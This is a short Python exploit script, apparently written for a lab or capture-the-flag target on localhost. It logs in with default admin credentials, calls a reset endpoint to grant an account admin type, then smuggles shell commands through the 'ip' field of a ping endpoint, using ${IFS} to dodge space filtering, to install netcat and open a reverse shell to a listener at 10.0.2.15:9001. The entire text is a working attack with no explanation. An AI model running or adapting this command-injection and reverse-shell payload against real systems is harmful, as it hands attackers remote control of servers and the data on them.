import requests

ip = "10.0.2.15"
listen_port = "9001"

port = "5108"
url = f"http://localhost:{port}"

s = requests.Session()

r = s.post(url + "/login", {"username": "admin", "password": "admin"})

r = s.post(url + "/reset", {"id": "0", "username": "admin", "password": "admin", "type": "admin"})

r = s.post(url + "/ping", {"ip": "$(apt-get${IFS}install${IFS}-y${IFS}netcat-traditional)"})

r = s.post(url + "/ping", {"ip": "$(nc${IFS}-c${IFS}sh${IFS}" + ip + "${IFS}" + listen_port + ")"})

print(r.text)